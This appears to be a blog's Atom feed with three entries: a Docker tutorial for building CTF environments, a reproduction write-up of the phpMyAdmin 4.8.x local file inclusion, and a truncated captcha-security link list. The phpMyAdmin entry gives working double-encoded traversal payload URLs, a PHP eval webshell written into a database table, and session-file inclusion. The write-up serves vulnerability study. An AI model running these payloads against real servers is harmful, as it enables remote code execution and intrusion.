<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mang0&#39;s blog</title>
  
  <subtitle>Love my love~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://mang0.me/"/>
  <updated>2018-10-29T13:59:47.677Z</updated>
  <id>http://mang0.me/</id>
  
  <author>
    <name>Mang0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>docker复现ctf&amp;dockerfile编写ctf环境</title>
    <link href="http://mang0.me/archives/47a94ec3/"/>
    <id>http://mang0.me/archives/47a94ec3/</id>
    <published>2018-10-29T13:57:39.000Z</published>
    <updated>2018-10-29T13:59:47.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker复现ctf-amp-dockerfile编写ctf环境"><a href="#docker复现ctf-amp-dockerfile编写ctf环境" class="headerlink" title="docker复现ctf&amp;dockerfile编写ctf环境"></a>docker复现ctf&amp;dockerfile编写ctf环境</h1><p>author：Mang0  </p><p>出题以及复现经常要使用docker，以前学习的不系统，从头学习记录，备忘一下</p><h2 id="0x00-基本概念"><a href="#0x00-基本概念" class="headerlink" title="0x00 基本概念"></a>0x00 基本概念</h2><p>Docker 包括三个基本概念</p><ul><li>镜像（<code>Image</code>）</li><li>容器（<code>Container</code>）</li><li>仓库（<code>Repository</code>）</li></ul><h2 id="0x01使用镜像"><a href="#0x01使用镜像" class="headerlink" title="0x01使用镜像"></a>0x01使用镜像</h2><h3 id="1-1获取镜像"><a href="#1-1获取镜像" class="headerlink" title="1.1获取镜像"></a>1.1获取镜像</h3><p>docker pull ubuntu:16.04</p><pre><code class="bash">docker run -it ubuntu:16.04 bash</code></pre><ul><li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 <code>bash</code> 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li><code>bash</code>：放在镜像名后的是<strong>命令</strong>，这里我们希望有个交互式 Shell，因此用的是 <code>bash</code>。</li><li><code>exit</code> 退出了这个容器。</li></ul><h3 id="1-2搜寻镜像"><a href="#1-2搜寻镜像" class="headerlink" title="1.2搜寻镜像"></a>1.2搜寻镜像</h3><pre><code>docker search ctf</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201809301113_804.png" alt=""></p><h3 id="1-3列出镜像"><a href="#1-3列出镜像" class="headerlink" title="1.3列出镜像"></a>1.3列出镜像</h3><pre><code class="bash">docker images == docker image ls</code></pre><p>使用tag添加镜像标签</p><pre><code class="bash">docker tag ubuntu:latest CTF:latest</code></pre><h3 id="1-4中间层镜像"><a href="#1-4中间层镜像" class="headerlink" title="1.4中间层镜像"></a>1.4中间层镜像</h3><pre><code class="bash">$ docker image ls -a</code></pre><p>只列出ubuntu的</p><pre><code class="bash">docker image ls ubuntu</code></pre><p>列出特定的某个镜像，也就是说指定仓库名和标签</p><pre><code class="bash">$ docker image ls ubuntu:16.04</code></pre><h3 id="1-5-删除本地镜像"><a href="#1-5-删除本地镜像" class="headerlink" title="1.5 删除本地镜像"></a>1.5 删除本地镜像</h3><h4 id="使用标签删除镜像"><a href="#使用标签删除镜像" class="headerlink" title="使用标签删除镜像"></a>使用标签删除镜像</h4><p>docker rmi myubuntu:latest</p><p>docker rmi 命令只是删除镜像多个标签中的指定标签而已， 并不影响镜像文件，但是镜像只剩下一个标签的时候要注意 再使用docker rmi命令会彻底删除镜像</p><p>强行删除</p><p>docker rmi -f ubuntu:16.04</p><p>docker rmi id</p><p>如果要删除本地的镜像，可以使用 <code>docker image rm</code> 命令，其格式为：</p><pre><code class="bash">docker image rm  【image id】</code></pre><h3 id="1-6-commit"><a href="#1-6-commit" class="headerlink" title="1.6  commit"></a>1.6  commit</h3><p>Docker 提供了一个 <code>docker commit</code> 命令，可以将容器的存储层保存下来成为镜像。换句话说，就是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。</p><p><code>docker commit</code> 的语法格式为：</p><pre><code class="bash">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></pre><p>使用history查看镜像历史</p><pre><code class="bash">docker history ubuntu:16.04</code></pre><p>新的镜像定制好后，我们可以来运行这个镜像。</p><pre><code class="bash">docker run --name web2 -d -p 81:80 nginx:v2</code></pre><h3 id="1-7-上传镜像"><a href="#1-7-上传镜像" class="headerlink" title="1.7 上传镜像"></a>1.7 上传镜像</h3><p>docker tag test:latest user/test:latest</p><p>docker push user/test:latest</p><h2 id="0x02-操作镜像"><a href="#0x02-操作镜像" class="headerlink" title="0x02 操作镜像"></a>0x02 操作镜像</h2><h3 id="2-1创建镜像"><a href="#2-1创建镜像" class="headerlink" title="2.1创建镜像"></a>2.1创建镜像</h3><p>docker create -it ubuntu:latests</p><p>docker start af</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开。</p><h4 id="守护态："><a href="#守护态：" class="headerlink" title="守护态："></a>守护态：</h4><pre><code>  docker run -d --name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</code></pre><p>如果使用了 <code>-d</code> 参数运行容器。此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 <code>docker logs</code> 查看)。</p><h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止的容器启动运行。</p><h3 id="2-2-终止容器"><a href="#2-2-终止容器" class="headerlink" title="2.2 终止容器"></a>2.2 终止容器</h3><p>docker stop ce5</p><p>docker start ce5 重启</p><p>通过 <code>docker container ls</code> 命令来查看容器信息。</p><pre><code>$ docker container ls -a</code></pre><h3 id="2-3-进入容器"><a href="#2-3-进入容器" class="headerlink" title="2.3 进入容器"></a>2.3 进入容器</h3><h4 id="attach-命令"><a href="#attach-命令" class="headerlink" title="attach 命令"></a><code>attach</code> 命令</h4><p><code>docker attach</code> 是 Docker 自带的命令。下面示例如何使用该命令。</p><pre><code class="bash">$ docker run -dit ubuntu243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES243c32535da7        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           nostalgic_hypatia$ docker attach 243croot@243c32535da7:/#</code></pre><p><em>注意：</em> 如果从这个 stdin 中 exit，会导致容器的停止。</p><h4 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a><code>exec</code> 命令</h4><p>-i -t 参数</p><p><code>docker exec</code> 后边可以跟多个参数，这里主要说明 <code>-i</code> <code>-t</code> 参数。</p><p>只用 <code>-i</code> 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p><pre><code class="bash">$ docker run -dit ubuntu69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES69d137adef7a        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           zealous_swirles$ docker exec -i 69d1 bash</code></pre><h3 id="2-4导出容器"><a href="#2-4导出容器" class="headerlink" title="2.4导出容器"></a>2.4导出容器</h3><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><pre><code class="bash">$ docker container ls -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES7691a814370e        ubuntu:14.04        &quot;/bin/bash&quot;         36 hours ago        Exited (0) 21 hours ago                       test$ docker export 7691a814370e &gt; ubuntu.tar</code></pre><p>这样将导出容器快照到本地文件。</p><h3 id="2-5导入容器快照"><a href="#2-5导入容器快照" class="headerlink" title="2.5导入容器快照"></a>2.5导入容器快照</h3><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像，例如</p><pre><code class="bash">$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZEtest/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</code></pre><h3 id="2-6删除容器"><a href="#2-6删除容器" class="headerlink" title="2.6删除容器"></a>2.6删除容器</h3><p>可以使用 <code>docker container rm</code> 来删除一个处于终止状态的容器。例如</p><pre><code class="bash">$ docker container rm id</code></pre><p>如果要删除一个运行中的容器，可以添加 <code>-f</code> 参数。Docker 会发送 <code>SIGKILL</code> 信号给容器。</p><h2 id="0x03-dockerfile"><a href="#0x03-dockerfile" class="headerlink" title="0x03 dockerfile"></a>0x03 dockerfile</h2><h3 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h3><pre><code>FROM node:8.4：该 image 文件继承官方的 node image，冒号表示标签，这里标签是8.4，即8.4版本的 node。COPY .[directory]：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的 directory 目录。WORKDIR [directory]：指定接下来的工作路径为 directory。RUN [cmd]：在/app目录下，运行[cmd]命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。EXPOSE [port]：将容器 port 端口暴露出来， 允许外部连接这个端口。CMD [cmd]：在容器启动后自动执行 [cmd] 命令</code></pre><blockquote><pre><code class="bash">FROM node:8.4COPY . /appWORKDIR /appRUN npm install --registry=https://registry.npm.taobao.orgEXPOSE 3000</code></pre></blockquote><p>上面代码一共五行，含义如下。</p><blockquote><ul><li><code>FROM node:8.4</code>：该 image 文件继承官方的 node image，冒号表示标签，这里标签是<code>8.4</code>，即8.4版本的 node。</li><li><code>COPY . /app</code>：将当前目录下的所有文件（除了<code>.dockerignore</code>排除的路径），都拷贝进入 image 文件的<code>/app</code>目录。</li><li><code>WORKDIR /app</code>：指定接下来的工作路径为<code>/app</code>。</li><li><code>RUN npm install</code>：在<code>/app</code>目录下，运行<code>npm install</code>命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</li><li><code>EXPOSE 3000</code>：将容器 3000 端口暴露出来， 允许外部连接这个端口。</li></ul></blockquote><h3 id="创建image文件"><a href="#创建image文件" class="headerlink" title="创建image文件"></a>创建image文件</h3><pre><code> docker image build -t myctf .docker build - &lt; Dockerfile</code></pre><p><code>-t</code>用来指定 image 文件的名字，后面还可用冒号指定标签，如果不指定，则默认为<code>latest</code>，</p><h3 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h3><p><code>docker container run</code> 命令会从 image 文件生成容器。</p><pre><code class="shell"> docker container run -p [port_local本地端口]:[port_container容器端口] -it image_name /bin/bash  docker container run -p 8000:3000 -it koa-demo /bin/bash   这就是在容器离得3000端口映射到本地8000端口 访问本机的8000端口就可以查看</code></pre><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>cd 到dockerfile存在的文件下</p><p> sudo docker build -t phplfi:v1 .</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201809301726_839.png" alt=""></p><p> sudo docker images</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201809301726_49.png" alt=""></p><p>sudo docker run -d -p 2333:80 phplfi:v1</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201809301727_684.png" alt=""></p><p>sudo docker run -it phplfi /bin/bash</p><h2 id="0x04-容器文件"><a href="#0x04-容器文件" class="headerlink" title="0x04 容器文件"></a>0x04 容器文件</h2><p>image 文件生成的容器实例，本身也是一个文件，称为容器文件。</p><pre><code># 列出本机正在运行的容器$ docker container ls# 列出本机所有容器，包括终止运行的容器$ docker container ls --all# 移除不需要的容器文件$ docker container rm [containerID]# 容器中止后自动删除容器文件$ docker container run --rm -p 8000:3000 -it image-file /bin/bash</code></pre><h2 id="0x05-网络配置"><a href="#0x05-网络配置" class="headerlink" title="0x05 网络配置"></a>0x05 网络配置</h2><h3 id="5-1映射容器端口到宿主主机的实现"><a href="#5-1映射容器端口到宿主主机的实现" class="headerlink" title="5.1映射容器端口到宿主主机的实现"></a>5.1映射容器端口到宿主主机的实现</h3><p>容器允许外部访问，可以在 <code>docker run</code> 时候通过 <code>-p</code> 或 <code>-P</code> 参数来启用。</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>自动分配一个端口</p><p>docker run -it –name dedefun -p 0.0.0.0::8080 dedefun:latest /bin/bash</p><h2 id="0x06-docker命令补齐"><a href="#0x06-docker命令补齐" class="headerlink" title="0x06 docker命令补齐"></a>0x06 docker命令补齐</h2><p>执行<code>source xxx</code>命令，先执行<code>source /usr/share/bash-completion/completions/docker</code>，再输入<code>docker</code>，然后按2次Tab键，提示错误如下：</p><pre><code class="bash">docker bash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expectedbash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expected</code></pre><p>注：第一行的docker，实际是输入的命令，其它是按Tab键的输出信息。</p><p>前面已经安装了<code>bash_completion</code>，于是想到执行</p><pre><code>source /usr/share/bash-completion/bash_completion</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201809301547_621.png" alt=""></p><h2 id="0x06-复现柠檬牛ctf"><a href="#0x06-复现柠檬牛ctf" class="headerlink" title="0x06 复现柠檬牛ctf"></a>0x06 复现柠檬牛ctf</h2><p>git clone <a href="https://github.com/l3m0n/My_CTF_Challenges.git" target="_blank" rel="external">https://github.com/l3m0n/My_CTF_Challenges.git</a></p><p>cd My_CTF_Challenges </p><p>cd </p><p>docker build -t dedefun ./</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>curl 127.0.0.1</p><p>cd  var/www/html </p><p>发现只有index.html  就运行下start.sh</p><p>./start.sh</p><p>退出 exit或者 ctrl +d</p><pre><code class="bash"> docker image ls</code></pre><p>终止状态的容器可以用 <code>docker container ls -a</code> 命令看到</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808202019_416.png" alt=""></p><h2 id="好文：Docker容器的创建、启动、和停止"><a href="#好文：Docker容器的创建、启动、和停止" class="headerlink" title="好文：Docker容器的创建、启动、和停止"></a>好文：<a href="https://www.cnblogs.com/linjiqin/p/8608975.html" target="_blank" rel="external">Docker容器的创建、启动、和停止</a></h2><p>1、容器是独立运行的一个或一组应用，及他们的运行环境。容器是Docker中的一个重要的概念。</p><p><strong>2、docker容器的启动有三种方式</strong><br>a.交互方式，基于镜像新建容器并启动<br>例如我们可以启动一个容器，打印出当前的日历表<br>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 cal ##my/python:v1为镜像名和标签<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141006656-1163681357.png" alt="img"></p><p>我们还可以通过指定参数，启动一个bash交互终端。<br>[root@rocketmq-nameserver4 ~]# docker run -it my/python:v1 /bin/bash<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141018576-2113140501.png" alt="img"><br>参数-t让Docker分配一个伪终端并绑定在容器的标准输入上，-i让容器的标准输入保持打开。</p><p>使用docker run命令来启动容器，docker在后台运行的标准操作包括<br>1.检查本地是否存在指定的镜像，不存在则从公有仓库下载<br>2.使用镜像创建并启动容器<br>3.分配一个文件系统，并在只读的镜像层外面挂载一层可读可写层<br>4.从宿主主机配置的网桥接口中桥接一个虚拟接口道容器中去<br>5.从地址池分配一个ip地址给容器<br>6.执行用户指定的应用程序<br>7.执行完毕之后容器被终止<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141029918-349771940.png" alt="img"><br>my/sinatra:v2基于training/sinatra镜像进行修改后的镜像，training/sinatra为公有仓库上的镜像。</p><p>b、短暂方式，直接将一个已经终止的容器启动运行起来<br>可以使用docker start命令，直接将一个已经终止的容器启动运行起来。</p><p>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 /bin/echo hello test<br>hello test<br>命令执行完，控制台会打印”hello test”，container就终止了，不过并没有消失，<br>可以用”docker ps -n 5 “看一下最新前5个的container，第一个就是刚刚执行过的container，可以再次执行一遍：docker start container_id</p><p>不过这次控制台看不到”hello test”了，只能看到ID，用logs命令才能看得到：docker logs container_id。<br>可以看到两个”hello test”了，因为这个container运行了两次。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141043102-2077108773.png" alt="img"></p><p>c、daemon方式，守护态运行<br>即让软件作为长时间服务运行，这就是SAAS啊！</p><p>例如我们启动centos后台容器，每隔一秒打印当天的日历。<br>$ docker run -d centos /bin/sh -c “while true;do echo hello docker;sleep 1;done”</p><p>启动之后，我们使用docker ps -n 5查看容器的信息</p><p>要查看启动的centos容器中的输出，可以使用如下方式：<br>$ docker logs $CONTAINER_ID ##在container外面查看它的输出<br>$ docker attach $CONTAINER_ID ##连接上容器实时查看：</p><p><strong>3、终止容器</strong><br>使用docker stop $CONTAINER_ID来终止一个运行中的容器。并且可以使用docker ps -a来看终止状态的容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141055377-965119728.png" alt="img"></p><p>终止状态的容器，可以使用docker start来重新启动。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141106848-1725632174.png" alt="img"></p><p>使用docker restart命令来重启一个容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141119426-840453652.png" alt="img"></p><p>invalid argument “Mysqlonline” for t: Error parsing reference: “Mysqlonline” is not a valid repository/tag: repository name must be lowercase See ‘docker build –help’.</p><p>原因真正原因是名称中带了大写的M O，将大写改为小写，创建成功。</p><p>坑啊，文档中并没有哪里要求只能是小写。</p><p>docker run -it –name mysqlonline -p 0.0.0.0:8080:80  mysqlonline:latest /bin/bash</p><p>sudo apt install curl</p><p>xftp<br>  202  ls<br>  203  cd geekweb1/<br>  204  clear<br>  205  ls<br>  206  pwd<br>  207  docker build -t tset/img /root/geekweb1<br>  208  docker images<br>  209  docker rmi c8daa6cadc73<br>  210  doker stop 036d7eabaf2e<br>  211  docker 036d7eabaf2e<br>  212  docker stop 036d7eabaf2e<br>  213  docker rm 036d7eabaf2e<br>  214  docker rmi c8daa6cadc73<br>  215  lsa<br>  216  cd ..<br>  217  ls<br>  218  rm -rf geekweb1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;docker复现ctf-amp-dockerfile编写ctf环境&quot;&gt;&lt;a href=&quot;#docker复现ctf-amp-dockerfile编写ctf环境&quot; class=&quot;headerlink&quot; title=&quot;docker复现ctf&amp;amp;dockerfile
      
    
    </summary>
    
      <category term="工具" scheme="http://mang0.me/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="docker" scheme="http://mang0.me/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin 4.8.x 本地文件包含</title>
    <link href="http://mang0.me/archives/767136e1/"/>
    <id>http://mang0.me/archives/767136e1/</id>
    <published>2018-10-27T14:19:37.000Z</published>
    <updated>2018-10-27T14:32:48.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-源码分析"><a href="#0x00-源码分析" class="headerlink" title="0x00 源码分析"></a>0x00 源码分析</h2><p>在/index.php     56行：</p><p><img src="" alt="img"></p><p>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。</p><p>首先，我们满足4个条件：</p><p>1．传入的target 需要是一个字符串。</p><p>2．不能以/index/ 开头。</p><p>3．不能在$target_blacklist数组内。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\052347bd2743c4b4c356996d842359de.png" alt="img"></p><p>4．满足checkPageValidity函数要求。</p><p>跟踪一下checkPageValidity函数</p><p>在/libraries/classes/Core.php  443行:</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\715e352918c11a7e8029bb2d9a897fe6.png" alt="img"></p><p>该函数内，有三处返回ture的地方，只要有任意一处返回ture就可以。观察这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\84f51699726302cc72be152d425b380b.png" alt="img"></p><p>我们先看第一个返回true的地方。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\bae25cd9638b29f7e362378fd4bffd41.png" alt="img"></p><p>这里的$page在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。</p><p>再来看第二个</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\7b3e77822c7d3ac4142d3725aaa69bb8.png" alt="img"></p><p>先介绍下这些函数的作用：</p><p>mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。</p><p>mb_substr()函数的意思是：</p><pre><code>string mb_substr ( string $str, int $start [, int $length = NULL [, string $encoding = mb_internal_encoding()]] )</code></pre><p>从$str字符串中，提取从$start位置开始，长度为$length的字符串。</p><p>可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。那是不是这样就可以造成漏洞了呢？</p><p>假设我们用db_sql.php?/../../../aaa.txt来绕过白名单限制进行包含文件。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\7c62ac55d4b22ce97d63800033f14835.png" alt="img"></p><p>那这里就是 include ‘db_sql.php?/../../../aaa.txt’。</p><p>这种格式并不能跨路径包含，因为php程序把？号后面的东西当成是传入db_sql.php文件的参数。</p><p>再来看第三个：</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\84beb310c9f8c555ea6fb71e0698f371.png" alt="img"></p><p>第三个和第二个对比多出了个urldecode()函数。</p><p>而问题恰恰出在了这个urldecode()函数。</p><p>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。</p><p>原因是：</p><p>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。</p><p>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>1.使用帐号 root ，密码 toor 登录 phpMyAdmin</p><p>2.点击顶部导航栏中的SQL按钮，执行SQL查询</p><pre><code class="sql">select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_5.png" alt="VulnSpy"></p><ol><li>获取自己的SESSION ID</li></ol><p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_6.png" alt="VulnSpy"></p><p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p><ol><li>包含SESSION文件，成功利用该漏洞</li></ol><pre><code class="bash">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_7.png" alt="VulnSpy"></p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>将WebShell写入到数据库中然后包含数据库文件，这个方法需要写入数据的权限。</p><p>在phpmyadmin中插入马的字段。比如 <code>&lt;?php eval($_GET[a])?&gt;</code></p><p>此时，如果mysql的路径被猜到的话，其实是可以知道该表中所存储的数据的。</p><pre><code class="vim">?a=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/HACK.ibd</code></pre><p>我不知道应该是ibd还是frm文件，但是最终发现这样会出错，猜测可能是字符编码的问题或者是mysql版本的问题。我mysql的版本比较高。可能数据文件不是这么好读取。</p><p>方法二：利用mysql的data文件：</p><p>不用写文件也能拿Shell的方法。</p><p>我们都知道，登入phpmyadmin后，数据库就是完全可以控制的了，那我们是否可以把WebShell写入到数据库中然后包含数据库文件</p><p>创建一个名为abc的表，并且字段设置为</p><pre><code>&lt;?php eval($_GET[‘z’]); ?&gt;。</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\0b17b8f7210a3d7894dca01435cfe609.png" alt="img"></p><p>保存，然后会在\MySQL\data\test目录下生成三个以数据表名命名的文件。（test为数据库名称）。</p><p>如果你不知道data文件路径，可以用sql查询来获取到它的绝对路径。</p><pre><code>show variables like &#39;%datadir%&#39;;</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\b071d225a03774b04f057f324a390a17.png" alt="img"></p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\2101ec2bbe439ab48a8ac574c16e189e.png" alt="img"></p><p>其中，abc.frm文件内容</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\2debae539b0d4aea4aef11dddf6af7b0.png" alt="img"></p><p>Payload：</p><pre><code>/index.php?z=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../ruanjian/phpstudy/PHPTutorial/MySQL/data/test/abc.frm</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\bebfd31b0d63a338eee12cda98393928.png" alt="img"></p><p>方法三：包含本地系统文件</p><p>Payload:</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini</code></pre><h2 id="0x03-参考文章漏洞细节"><a href="#0x03-参考文章漏洞细节" class="headerlink" title="0x03 参考文章漏洞细节"></a>0x03 参考文章漏洞细节</h2><p>参照ChaMd5安全团队发布的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-源码分析&quot;&gt;&lt;a href=&quot;#0x00-源码分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 源码分析&quot;&gt;&lt;/a&gt;0x00 源码分析&lt;/h2&gt;&lt;p&gt;在/index.php     56行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;&quot; al
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://mang0.me/categories/WebSecurity/"/>
    
    
      <category term="复现" scheme="http://mang0.me/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>验证码相关安全问题</title>
    <link href="http://mang0.me/archives/b46a6d47/"/>
    <id>http://mang0.me/archives/b46a6d47/</id>
    <published>2018-10-23T15:05:15.000Z</published>
    <updated>2018-10-23T16:08:17.043Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-乌云知识库"><a href="#0x00-乌云知识库" class="headerlink" title="0x00 乌云知识库:"></a>0x00 乌云知识库:</h2><ul><li><a href="http://drops.ichenfei.com/web-5459.html" target="_blank" rel="external">验证码安全问题汇总</a></li><li><a href="http://drops.ichenfei.com/tips-141.html" target="_blank" rel="external">聊一聊随机数安全</a></li><li><a href="http://drops.ichenfei.com/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li><li><a href="http://drops.ichenfei.com/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li></ul><h2 id="0x01-其他相关文章"><a href="#0x01-其他相关文章" class="headerlink" title="0x01 其他相关文章"></a>0x01 其他相关文章</h2><ul><li><a href="http://www.cnbraid.com/2016/captcha.html" target="_blank" rel="external">【安全加固】 验证码的实现原理和安全问题汇总</a></li><li><a href="http://blog.csdn.net/niaonao/article/details/51112686" target="_blank" rel="external">验证码原理分析及实现</a></li><li><a href="https://lizonghang.github.io/2016/07/10/%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AD%97%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E7%94%9F%E6%88%90%E5%92%8C%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">随机数字图片验证码的原理、生成和破解</a></li><li><a href="http://www.lijiejie.com/safe-issues-of-captcha/" target="_blank" rel="external">图形验证码的常见安全问题</a></li></ul><h2 id="0x02-乌云相关案例"><a href="#0x02-乌云相关案例" class="headerlink" title="0x02 乌云相关案例"></a>0x02 乌云相关案例</h2><ul><li><a href="http://wy.ichenfei.com/searchbug.php?q=%E9%AA%8C%E8%AF%81%E7%A0%81" target="_blank" rel="external">http://wy.ichenfei.com/searchbug.php?q=验证码</a>  <!-- - [http://es.ichenfei.com:8000/wysearch/?q=验证码](http://es.ichenfei.com:8000/wysearch/?q=验证码) --></li></ul><h2 id="0x03-验证码实现原理"><a href="#0x03-验证码实现原理" class="headerlink" title="0x03 验证码实现原理"></a>0x03 验证码实现原理</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201810240004_376.jpg" 